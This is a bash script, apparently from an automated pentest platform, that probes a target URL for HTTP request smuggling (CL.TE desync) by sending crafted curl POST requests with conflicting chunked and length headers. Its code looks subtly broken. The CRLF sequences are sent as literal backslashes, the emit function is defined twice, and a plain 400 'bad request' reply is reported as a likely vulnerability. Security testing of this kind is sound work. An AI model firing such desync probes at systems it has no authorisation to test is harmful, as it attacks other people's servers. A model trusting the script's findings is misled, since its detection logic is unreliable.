#!/usr/bin/env bash
# ============================================================================
# SentinelAI Autonomous Pentest Platform — Security PoC Probe
# Name:        HTTP Request Smuggling CL.TE Probe
# Description: Tests for Content-Length + Transfer-Encoding desync
# Severity:    HIGH
# Category:    Web Server & HTTP Misconfigurations
# Language:    bash
# ============================================================================

# Target argument handling: allow positional arg $1 or env var TARGET
TARGET="${1:-${TARGET:-}}"
SCAN_ID="${SCAN_ID:-standalone_poc_test}"
DEPTH="${DEPTH:-standard}"

if [ -z "$TARGET" ]; then
  echo -e "\033[1;31m[-] Error: Missing TARGET argument.\033[0m"
  echo -e "\033[1;33m[*] Usage:   $0 <target_url_or_ip>\033[0m"
  echo -e "\033[1;34m[*] Example: $0 https://example.com\033[0m"
  exit 1
fi

# Normalize URL: remove trailing slash
TARGET="${TARGET%/}"

echo -e "\033[1;36m[*] [SentinelAI PoC] Running probe: HTTP Request Smuggling CL.TE Probe\033[0m"
echo -e "\033[1;34m[*] Target: $TARGET\033[0m"
echo ""

# Standard emit handler for standalone terminal execution
emit() {
  echo -e "\033[1;32m[+] VULNERABILITY CONFIRMED / FINDING EMITTED:\033[0m"
  echo "$1" | python3 -m json.tool 2>/dev/null || echo "    $1"
}

# --- Core PoC Execution ---
emit() { printf '%s\n' "$1"; }
T="$TARGET"
HOST=$(echo "$T" | sed 's|https\?://||' | cut -d/ -f1)
# CL.TE probe — send both CL and TE headers
RESP=$(curl -s -o /dev/null -w "%{http_code}|%{time_total}" -X POST -H "Content-Type: application/x-www-form-urlencoded" -H "Transfer-Encoding: chunked" -d "0\r\n\r\nG" --max-time 15 "$T/" 2>/dev/null)
CODE=$(echo "$RESP" | cut -d'|' -f1)
TIME=$(echo "$RESP" | cut -d'|' -f2)
# if server hangs or errors, potential desync
if [ "$CODE" = "400" ]; then
  # check error message for clues
  BODY=$(curl -s -X POST -H "Transfer-Encoding: chunked" -d "0\r\n\r\n" --max-time 10 "$T/" 2>/dev/null | head -c 300)
  if echo "$BODY" | grep -qi "bad request\|invalid\|smuggl"; then
    emit "{\"title\":\"Potential HTTP request smuggling (CL.TE)\",\"severity\":\"high\",\"description\":\"Server responds 400 to conflicting Content-Length/Transfer-Encoding headers with detailed error. Desync between front-end and back-end may allow request smuggling.\",\"remediation\":\"Normalize requests at proxy layer. Reject requests with both CL and TE headers. Use HTTP/2 end-to-end.\",\"cweId\":\"CWE-444\",\"owaspCategory\":\"A05:2025-Security Misconfiguration\"}"
  fi
fi

echo ""
echo -e "\033[1;34m[*] Probe execution complete.\033[0m"
